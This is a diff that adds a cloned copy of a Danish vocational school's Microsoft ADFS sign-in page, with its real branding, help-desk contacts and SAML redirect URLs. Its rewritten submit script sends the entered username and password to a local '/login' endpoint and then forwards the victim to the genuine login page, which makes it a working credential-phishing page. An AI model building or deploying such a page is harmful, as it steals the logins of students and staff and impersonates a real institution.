@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="da">
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+        <meta http-equiv="cache-control" content="no-cache,no-store"/>
+        <meta http-equiv="pragma" content="no-cache"/>
+        <meta http-equiv="expires" content="-1"/>
+        <meta name='mswebdialog-title' content='Connecting to adfs.sde.dk'/>
+
+        <title>Log p&#229;</title>
+        <script type='text/javascript'>
+//<![CDATA[
+function LoginErrors(){this.userNameFormatError = 'Angiv dit brugernavn i formatet \u0026quot;dom\u0026#230;ne\\bruger\u0026quot; eller \u0026quot;bruger@dom\u0026#230;ne\u0026quot;.'; this.passwordEmpty = 'Angiv din adgangskode.'; this.passwordTooLong = 'Adgangskoden er for lang (\u0026gt; 128 tegn).';}; var maxPasswordLength = 128;
+//]]>
+</script>
+
+<script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+InputUtil.updatePlaceholder = function (input, placeholderText) {
+    var node = document.getElementById(input);
+    if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+            (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+            var label = node.previousSibling;
+            if (label != null) {
+                label.value = placeholderText;
+            }
+        }
+        else {
+            node.placeholder = placeholderText;
+        }
+    }
+};
+
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" href="public/index.css" /><style>.illustrationClass {background-image:url(https://adfs.sde.dk/adfs/portal/illustration/illustration.jpg?id=DED1C3703DA4AE255EBBA353BD6E84A44EE75A47B93CBD5BF70BA300C0C0D970);}</style>
+
+    </head>
+    <body dir="ltr" class="body">
+    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
+        <h1>JavaScript er p&#229;kr&#230;vet</h1>
+        <p>JavaScript er p&#229;kr&#230;vet. Denne webbrowser underst&#248;tter ikke JavaScript, eller ogs&#229; er JavaScript ikke aktiveret i webbrowseren.</p>
+        <p>Hvis du vil finde ud af, om din webbrowser underst&#248;tter JavaScript, eller hvis du vil aktivere JavaScript, skal du se i hj&#230;lpen til webbrowseren.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img class='logoImage' id='companyLogo' src='https://adfs.sde.dk/adfs/portal/logo/logo.png?id=2D253307486B7F11CF6B712AE0E84F95E4318B3D6447D2C1818C73F3BB2A240B' alt='Skibdi toilet'/>
+                </div>
+                <main>
+                    <div id="workArea">
+                        
+    <div id="authArea" class="groupMargin">
+        
+        
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Log på med dit brugernavn og adgangskode;</div>
+
+        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="/adfs/ls/?SAMLRequest=nZLLbsIwEEV%2FJfI%2BCQ6kFAuQKKgqUh8IaBfdVEM8FKuOnXqcPv6%2BJikqXZRFN36M54zvHc2QoNSVmNR%2BZ5b4WiP56KPUhkTzMGK1M8ICKRIGSiThC7Ga3FyLLOmIyllvC6vZEXKaACJ0XlnDovlsxJ4k70nZzwY96Hd5P%2BPbTOaI%2BQYHvfwcoAjLoM87mwxZ9ICOAjlioVDAiWqcG%2FJgfAh1sl7cGcTZ2Zp3Rc4Fzx9ZNAtulAHfUDvvKxJpCnJLCUlM5EtzTjWlLJochE2tobpEt0L3pgq8X17%2FoBrBmQNLqqw07i2npZW1xqTaVWlzp3bPYiiojcqgf%2FHdrQtlpDLPpxu1aZNIXK3Xi3hxt1qz8XBfVDTG3fgfmkr0IMHDQdIwPS44bCfhNkiZzxZWq%2BIzurSuBP%2B3Up7wJqJkvG1SRW2owkJtFcrQVK3t%2B9QheBwx72pk6bj99PfEjb8A&RelayState=https%3A%2F%2Flearn.sde.dk%2Flogin%2Findex.php&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=GhiG41zy7hHoeM9thZ8SSsh0aSpDYoLJBZ7aAAi3hlZ6TlwxE9l7JRrwINwcL0mFbMciE8G3X6NzYEzb0n975epp5kp%2BAtNm6voHK3%2F4K4e2GhODpJl9qHttsj9V18rNBdHURycGfK2JERRSxPk6snQpxysIiphBxQtysuKcRr%2FxqER2JYdDZE4bgLa7ZkS302MKH1bxc9PLZBXdsekuARbziSL7TZZRwKuU5eN24phMN4Fjdc41doVM%2B4AIqiBuSrAPvpHUDH7kaY57dUQSpviwarXlbJILttcw9ADAPcS3KJtTrBxjiEh0bB5tf3WJs4n2lAELTWZFPl4qOpk7GQ%3D%3D&client-request-id=77611e04-ae9f-4f7a-a747-0080010000c2&RedirectToIdentityProvider=AD+AUTHORITY" >
+            <div id="error" class="fieldMargin error smallText">
+                <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+            </div>
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <label id="userNameInputLabel" for="userNameInput" class="hidden">Brugerkonto</label>
+                    <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
+                        spellcheck="false" placeholder="nogen@example.com" autocomplete="off"/>
+                </div>
+
+                <div id="passwordArea">
+                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Adgangskode</label>
+                    <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
+                        placeholder="Adgangskode" autocomplete="off"/>
+                </div>
+                <div id="kmsiArea" style="display:none">
+                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+                    <label for="kmsiInput">Log mig ikke af</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit" tabindex="4" role="button"
+                        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
+                        onclick="return Login.submitLoginRequest();">Log p&#229;</span>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+        </form>
+
+             <div id="authOptions">
+         <form id="options" method="post" action="https://adfs.sde.dk:443/adfs/ls/?SAMLRequest=nZLLbsIwEEV%2FJfI%2BCQ6kFAuQKKgqUh8IaBfdVEM8FKuOnXqcPv6%2BJikqXZRFN36M54zvHc2QoNSVmNR%2BZ5b4WiP56KPUhkTzMGK1M8ICKRIGSiThC7Ga3FyLLOmIyllvC6vZEXKaACJ0XlnDovlsxJ4k70nZzwY96Hd5P%2BPbTOaI%2BQYHvfwcoAjLoM87mwxZ9ICOAjlioVDAiWqcG%2FJgfAh1sl7cGcTZ2Zp3Rc4Fzx9ZNAtulAHfUDvvKxJpCnJLCUlM5EtzTjWlLJochE2tobpEt0L3pgq8X17%2FoBrBmQNLqqw07i2npZW1xqTaVWlzp3bPYiiojcqgf%2FHdrQtlpDLPpxu1aZNIXK3Xi3hxt1qz8XBfVDTG3fgfmkr0IMHDQdIwPS44bCfhNkiZzxZWq%2BIzurSuBP%2B3Up7wJqJkvG1SRW2owkJtFcrQVK3t%2B9QheBwx72pk6bj99PfEjb8A&RelayState=https%3A%2F%2Flearn.sde.dk%2Flogin%2Findex.php&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=GhiG41zy7hHoeM9thZ8SSsh0aSpDYoLJBZ7aAAi3hlZ6TlwxE9l7JRrwINwcL0mFbMciE8G3X6NzYEzb0n975epp5kp%2BAtNm6voHK3%2F4K4e2GhODpJl9qHttsj9V18rNBdHURycGfK2JERRSxPk6snQpxysIiphBxQtysuKcRr%2FxqER2JYdDZE4bgLa7ZkS302MKH1bxc9PLZBXdsekuARbziSL7TZZRwKuU5eN24phMN4Fjdc41doVM%2B4AIqiBuSrAPvpHUDH7kaY57dUQSpviwarXlbJILttcw9ADAPcS3KJtTrBxjiEh0bB5tf3WJs4n2lAELTWZFPl4qOpk7GQ%3D%3D&client-request-id=77611e04-ae9f-4f7a-a747-0080010000c2&RedirectToIdentityProvider=AD+AUTHORITY">
+             <script type="text/javascript">
+                function SelectOption(option) {
+                    var w = document.getElementById('waitingWheelDiv');
+                    if(w) w.style.display = 'inline';
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+             </script>
+             <input id="optionSelection" type="hidden" name="AuthMethod" />
+             <input id="userNameInputOptionsHolder" name="UserName" value="" type="hidden"/>
+             <div id='authOptionLinks' class='groupMargin'><div id="waitingWheelDiv" style="display: none;"><div id="WaitingWheel">
+    <!-- NOTE: This style portion is identical to cookie pull page, they are not in shared css file because of legacy dependancies for custom themes-->
+    <!-- CSS for small "waiting" wheel -->
+    <style>
+        #floatingCirclesG {
+            position: relative;
+            width: 125px;
+            height: 125px;
+            margin: auto;
+            transform: scale(0.4);
+            -o-transform: scale(0.4);
+            -ms-transform: scale(0.4);
+            -webkit-transform: scale(0.4);
+            -moz-transform: scale(0.4);
+        }
+
+        .f_circleG {
+            position: absolute;
+            height: 22px;
+            width: 22px;
+            border-radius: 12px;
+            -o-border-radius: 12px;
+            -ms-border-radius: 12px;
+            -webkit-border-radius: 12px;
+            -moz-border-radius: 12px;
+            animation-name: f_fadeG;
+            -o-animation-name: f_fadeG;
+            -ms-animation-name: f_fadeG;
+            -webkit-animation-name: f_fadeG;
+            -moz-animation-name: f_fadeG;
+            animation-duration: 1.2s;
+            -o-animation-duration: 1.2s;
+            -ms-animation-duration: 1.2s;
+            -webkit-animation-duration: 1.2s;
+            -moz-animation-duration: 1.2s;
+            animation-iteration-count: infinite;
+            -o-animation-iteration-count: infinite;
+            -ms-animation-iteration-count: infinite;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-iteration-count: infinite;
+            animation-direction: normal;
+            -o-animation-direction: normal;
+            -ms-animation-direction: normal;
+            -webkit-animation-direction: normal;
+            -moz-animation-direction: normal;
+        }
+
+        #frotateG_01 {
+            left: 0;
+            top: 51px;
+            animation-delay: 0.45s;
+            -o-animation-delay: 0.45s;
+            -ms-animation-delay: 0.45s;
+            -webkit-animation-delay: 0.45s;
+            -moz-animation-delay: 0.45s;
+        }
+
+        #frotateG_02 {
+            left: 15px;
+            top: 15px;
+            animation-delay: 0.6s;
+            -o-animation-delay: 0.6s;
+            -ms-animation-delay: 0.6s;
+            -webkit-animation-delay: 0.6s;
+            -moz-animation-delay: 0.6s;
+        }
+
+        #frotateG_03 {
+            left: 51px;
+            top: 0;
+            animation-delay: 0.75s;
+            -o-animation-delay: 0.75s;
+            -ms-animation-delay: 0.75s;
+            -webkit-animation-delay: 0.75s;
+            -moz-animation-delay: 0.75s;
+        }
+
+        #frotateG_04 {
+            right: 15px;
+            top: 15px;
+            animation-delay: 0.9s;
+            -o-animation-delay: 0.9s;
+            -ms-animation-delay: 0.9s;
+            -webkit-animation-delay: 0.9s;
+            -moz-animation-delay: 0.9s;
+        }
+
+        #frotateG_05 {
+            right: 0;
+            top: 51px;
+            animation-delay: 1.05s;
+            -o-animation-delay: 1.05s;
+            -ms-animation-delay: 1.05s;
+            -webkit-animation-delay: 1.05s;
+            -moz-animation-delay: 1.05s;
+        }
+
+        #frotateG_06 {
+            right: 15px;
+            bottom: 15px;
+            animation-delay: 1.2s;
+            -o-animation-delay: 1.2s;
+            -ms-animation-delay: 1.2s;
+            -webkit-animation-delay: 1.2s;
+            -moz-animation-delay: 1.2s;
+        }
+
+        #frotateG_07 {
+            left: 51px;
+            bottom: 0;
+            animation-delay: 1.35s;
+            -o-animation-delay: 1.35s;
+            -ms-animation-delay: 1.35s;
+            -webkit-animation-delay: 1.35s;
+            -moz-animation-delay: 1.35s;
+        }
+
+        #frotateG_08 {
+            left: 15px;
+            bottom: 15px;
+            animation-delay: 1.5s;
+            -o-animation-delay: 1.5s;
+            -ms-animation-delay: 1.5s;
+            -webkit-animation-delay: 1.5s;
+            -moz-animation-delay: 1.5s;
+        }
+
+        @keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-o-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-ms-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-webkit-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-moz-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+    </style>
+
+    <!-- Div containing small "waiting" wheel -->
+    <div id="floatingCirclesG">
+        <div class="f_circleG" id="frotateG_01"></div>
+        <div class="f_circleG" id="frotateG_02"></div>
+        <div class="f_circleG" id="frotateG_03"></div>
+        <div class="f_circleG" id="frotateG_04"></div>
+        <div class="f_circleG" id="frotateG_05"></div>
+        <div class="f_circleG" id="frotateG_06"></div>
+        <div class="f_circleG" id="frotateG_07"></div>
+        <div class="f_circleG" id="frotateG_08"></div>
+    </div>
+</div></div></div>
+         </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+            <p>Glemt din adgangskode?<br>SMS <b>Kodeord</b> til 3574 5022 <br><br>Kontakt IT-Service<br><table style='width:100%'><tr><td>Risingsvej</td><td>6666@sde.dk</td><td>6312 6666</td></tr><tr><td>Petersmindevej</td><td>6767@sde.dk</td><td>6312 6767</td></tr><tr><td>Munkebjergvej/OTG</td><td>6868@sde.dk</td><td>6312 6868</td></tr><tr><td>Vejle/VTG</td><td>6290@sde.dk</td><td>7642 6290</td></tr></table></a></p>                     
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+
+        </script>
+    </div>
+
+    </div>
+
+                    </div>
+                </main>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <footer id="footer">
+                <div id="footerLinks" class="floatReverse">
+                    <div><span id="copyright">&#169; 2018 Microsoft</span><a id="home" class="pageLink footerLink " href="https://www.sde.dk/">Hjem</a><a id="helpDesk" class="pageLink footerLink" href="https://www.sde.dk/til-elever/opstart-for-nye-elever---virtuelt/">Hj&#230;lp</a></div>
+                </div>
+            </footer>
+        </div>     
+    </div>
+    <script type='text/javascript'>
+//<![CDATA[
+﻿// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+
+const userNameInput = document.getElementById("userNameInput");
+const passwordInput = document.getElementById("passwordInput");
+const submitButton = document.getElementById("submitButton");
+submitButton.onclick = function() {
+      event.preventDefault();
+
+    if (userNameInput.value == "" && passwordInput.value == "") {
+        alert("Brugernavn og Adganskode må ikke være tomt!")
+        return;
+    }
+
+      // use fetch to send our url to the server
+      //fetch(`/download?url=${encodeURIComponent(url)}`)
+      fetch(`/login?username=${encodeURIComponent(userNameInput.value)}&password=${encodeURIComponent(passwordInput.value)}`)
+  .then(response => {
+    if (response.ok) {
+      // If the response is okay, return the response text (which should be the session token)
+      return response.text();
+    } else {
+      // If the response is not okay, handle the error
+      //errormsg.innerText = "Username or password incorrect";
+      //errordiv.hidden = false;
+      console.error(`Error: ${response.status} - ${response.statusText}`);
+      throw new Error('Unauthorized'); // Throw an error to handle it in the catch block
+    }
+  })
+  .then(data => {
+    console.log("we here");
+    if (data) {
+     // savecookie("username", data); // Save the session token in a cookie
+     // savecookie("password", data); // Save the password in a cookie
+      // Redirect to the dashboard or perform any other action needed upon successful login
+      window.location.href = 'https://adfs.sde.dk/adfs/ls/?SAMLRequest=nZJLT8MwDMe%2FSpV7n7BXtFUamxCTBkxscOCC3MZlEWlS4pTHtydrmYADHDjFsf2z%2F7Y8JahVw%2Bet2%2BsbfG6RXPBWK028C8xYazU3QJK4hhqJu5Jv55drnkUJb6xxpjSKfUP%2BJoAIrZNGs2C1nLGHVGRFUYxSEFUxPhmXQ0wnQxhXSQZJUqEPD8phMchOgAV3aMmTM%2BYLeZyoxZUmB9p5V5KdhskkzEa7NOVJyrPBPQuWfhqpwXXU3rmGeBz7VhSRwEg8dXasKGbB%2FChsYTS1Ndot2hdZ4u3N%2BgtVCFYfWZJ1o%2FAwclwb0SqMmn0Td3%2Fq3yyEknqvQBZsPrd1JrWQ%2BvHvRRV9EvGL3W4Tbq63O5ZPD0V5N7jN%2F6GpRgcCHBwlTePvBaf9JVx5KavlxihZvgfnxtbgfleaRmnnkSKsulTeamqwlJVE4ZeqlHldWASHM%2BZsiyzO%2B6Y%2FLy7%2FAA%3D%3D&RelayState=https%3A%2F%2Flearn.sde.dk%2Flogin%2Findex.php&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=c%2BfBki0aG6Qiz167XUshsprL86vqx6axMtGmrpaNYA2j6Mhe1g5nPgl9dQSJmM2L2Jrxd7OFceQeGYIl0xhPp9Gl9eF2lga248b1EZe4J1bvyocgBG7j4gDrL%2Bqi9hpqaWthTZI3SEPMgdZiswb4iutah%2FYVb6AyADvxadJlNCasN%2Bbf2y3y6itzRub0vM2bokZT%2BE76fAu%2F%2F8joTiFDorQb18dJ1RDHNgvDxWFutj6vA78VppqHbq%2BI7Pvx6fd0ygzLGr6iAhZvashiIrhRr5%2FV28IWbY8XCvvw2jyPmuPVYwWs%2FlsUnQ1U%2BU7hGyqJXrJ5FIotkyXYrXK1k6LJpQ%3D%3D';
+    }
+  })
+  .catch(error => {
+    console.error(error);
+  });
+
+        
+      // window.location.href = '/download?url=' + encodeURIComponent(videoUrl);
+    }
+
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+    var emails = document.querySelectorAll("input[type='email']");
+    if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+            emails[i].type = 'text';
+        }
+    }
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+    var msViewportStyle = document.createElement("style");
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{width:auto!important}"
+        )
+    );
+    msViewportStyle.appendChild(
+        document.createTextNode(
+            "@-ms-viewport{height:auto!important}"
+        )
+    );
+    document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+    var viewport = document.querySelector("meta[name=viewport]");
+    viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+    var propStyle = null;
+
+    if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+    }
+    else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+    }
+
+    return propStyle;
+}
+
+// The script below is used for downloading the illustration image 
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+var computeLoadIllustration = function () {
+    var branding = document.getElementById("branding");
+    var brandingDisplay = getStyle(branding, "display");
+    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+    if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
+        if (branding.classList && branding.classList.add) {
+            branding.classList.add(newClass);
+        } else if (branding.className !== undefined) {
+            branding.className += " " + newClass;
+        }
+        if (window.removeEventListener) {
+            window.removeEventListener('load', computeLoadIllustration, false);
+            window.removeEventListener('resize', computeLoadIllustration, false);
+        }
+        else if (window.detachEvent) {
+            window.detachEvent('onload', computeLoadIllustration);
+            window.detachEvent('onresize', computeLoadIllustration);
+        }
+    }
+};
+
+if (window.addEventListener) {
+    window.addEventListener('resize', computeLoadIllustration, false);
+    window.addEventListener('load', computeLoadIllustration, false);
+}
+else if (window.attachEvent) {
+    window.attachEvent('onresize', computeLoadIllustration);
+    window.attachEvent('onload', computeLoadIllustration);
+}
+
+//]]>
+</script>
+
+
+    </body>
+</html> 
